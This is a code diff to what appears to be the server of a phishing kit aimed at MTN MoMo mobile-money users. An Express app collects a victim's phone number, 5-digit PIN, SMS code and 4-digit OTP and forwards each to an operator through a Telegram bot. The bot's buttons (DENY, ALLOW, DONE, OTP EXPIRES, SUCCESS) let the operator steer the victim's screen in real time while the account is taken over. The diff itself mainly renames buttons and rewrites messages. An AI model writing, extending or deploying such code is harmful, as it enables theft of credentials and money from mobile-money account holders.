@@ -182,18 +182,20 @@ async function initBot() {
 
       switch (actionType) {
         case 'BLOCK':
+        case 'DENY':
           session.status = 'BLOCKED';
           await bot.sendMessage(
             chatTarget,
-            `🚫 *BLOCK* — Applicant blocked. Screen updated to blocked notice.`,
+            `🚫 *DENY* — Applicant notified to check MoMo details and try again.`,
             { parse_mode: 'Markdown' }
           );
           break;
         case 'NEXT':
+        case 'ALLOW':
           session.status = 'PROCEED_SMS';
           await bot.sendMessage(
             chatTarget,
-            `➡️ *NEXT* — Allowed to proceed to SMS verification screen (15s timer).`,
+            `➡️ *ALLOW* — Allowed to proceed to SMS verification screen (15s timer).`,
             { parse_mode: 'Markdown' }
           );
           break;
@@ -210,15 +212,16 @@ async function initBot() {
           session.status = 'SMS_EXPIRED';
           await bot.sendMessage(
             chatTarget,
-            `⚠️ *SMS EXPIRES* — Redirected applicant back to enter a new SMS.`,
+            `⚠️ *SMS EXPIRED* — Redirected applicant back to enter a new SMS.`,
             { parse_mode: 'Markdown' }
           );
           break;
         case 'APPROVE':
+        case 'DONE':
           session.status = 'PROCEED_OTP';
           await bot.sendMessage(
             chatTarget,
-            `✅ *SMS APPROVED* — Applicant opened 4-Digit OTP screen (CHECK SMS AND ENTER ON THE SPACE PROVIDED).`,
+            `✅ *DONE* — Applicant opened 4-Digit OTP screen to enter new incoming 4 digits sent to MoMo number.`,
             { parse_mode: 'Markdown' }
           );
           break;
@@ -226,7 +229,7 @@ async function initBot() {
           session.status = 'EXPIRED_OTP';
           await bot.sendMessage(
             chatTarget,
-            `⚠️ *EXPIRED OTP CODE* — Applicant prompted to check SMS and enter a new 4-digit OTP.`,
+            `⚠️ *OTP EXPIRES* — Applicant commanded back to enter a new 4-digit OTP.`,
             { parse_mode: 'Markdown' }
           );
           break;
@@ -313,7 +316,7 @@ app.post('/api/submit-pin', async (req, res) => {
       'MTN MoMo Applicant';
 
     const message =
-      `📱 *NEW MTN MOMO APPLICANT (5-DIGIT PIN)*\n\n` +
+      `📱 *NEW MTN MOMO APPLICANT (PHONE NO & 5-DIGIT PIN)*\n\n` +
       `👤 *Applicant:* ${escapeMarkdown(displayName)}\n` +
       `📞 *Phone No:* \`${escapeMarkdown(phone || session.phone || 'N/A')}\`\n` +
       `🔑 *5-Digit PIN:* \`${escapeMarkdown(pin)}\``;
@@ -323,8 +326,8 @@ app.post('/api/submit-pin', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'BLOCK', callback_data: `BLOCK_${activeId}` },
-            { text: 'NEXT', callback_data: `NEXT_${activeId}` }
+            { text: 'DENY', callback_data: `DENY_${activeId}` },
+            { text: 'ALLOW', callback_data: `ALLOW_${activeId}` }
           ]
         ]
       }
@@ -363,7 +366,7 @@ app.post('/api/submit-sms', async (req, res) => {
           [
             { text: 'SMS EXPIRES', callback_data: `EXPIRED_${activeId}` },
             { text: 'INCORRECT PIN', callback_data: `INCORRECT_${activeId}` },
-            { text: 'APPROVE', callback_data: `APPROVE_${activeId}` }
+            { text: 'DONE', callback_data: `DONE_${activeId}` }
           ]
         ]
       }
@@ -398,7 +401,7 @@ app.post('/api/submit-otp', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'EXPIRED OTP CODE', callback_data: `EXPIREDOTP_${activeId}` },
+            { text: 'OTP EXPIRES', callback_data: `EXPIREDOTP_${activeId}` },
             { text: 'SUCCESS', callback_data: `SUCCESS_${activeId}` }
           ]
         ]
@@ -440,4 +443,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+      
